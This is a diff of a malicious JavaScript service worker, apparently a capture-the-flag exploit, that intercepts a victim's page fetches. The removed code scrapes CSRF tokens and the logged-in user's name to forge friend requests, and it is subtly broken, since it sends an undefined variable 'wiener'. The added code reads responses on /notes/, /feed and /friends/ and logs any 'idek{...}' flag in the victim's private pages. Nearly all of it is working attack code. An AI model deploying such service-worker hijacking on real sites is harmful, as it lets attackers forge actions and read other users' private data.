@@ -1,38 +1,18 @@
 self.addEventListener("fetch", (event) => {
   const url = new URL(event.request.url);
+  const pathsToCheck = ["/notes/", "/feed", "/friends/"];
 
-  if (url.pathname === "/friends/") {
+  if (pathsToCheck.some((p) => url.pathname.startsWith(p))) {
     event.respondWith(
       (async () => {
         const response = await fetch(event.request);
         const text = await response.text();
 
-        // Extract CSRF token
-        const csrfMatch = text.match(/name="csrf_token" value="(.*?)"/);
-        const csrf = csrfMatch ? csrfMatch[1] : null;
-
-        // Extract bot's username
-        const botMatch = text.match(/logged in as <b>(.*?)<\/b>/i);
-        const botUsername = botMatch ? botMatch[1] : null;
-
-        console.log("[DEBUG] Extracted CSRF:", csrf);
-        console.log("[DEBUG] Extracted bot username:", botUsername);
-
-        // Replace this with your own username on the site
-        const yourUsername = "kamran";
-
-        // Send friend request
-        if (csrf && botUsername) {
-          await fetch("/friends/request", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/x-www-form-urlencoded"
-            },
-            body: `username=${wiener}&csrf_token=${encodeURIComponent(csrf)}`
-          });
-          console.log("[ACTION] Sent friend request to bot.");
+        const match = text.match(/idek{.*?}/);
+        if (match) {
+          console.log("[FLAG]", match[0]);
         } else {
-          console.log("[ERROR] Failed to extract CSRF or username.");
+          console.log(`[INFO] No flag found in ${url.pathname}`);
         }
 
         return new Response(text, {
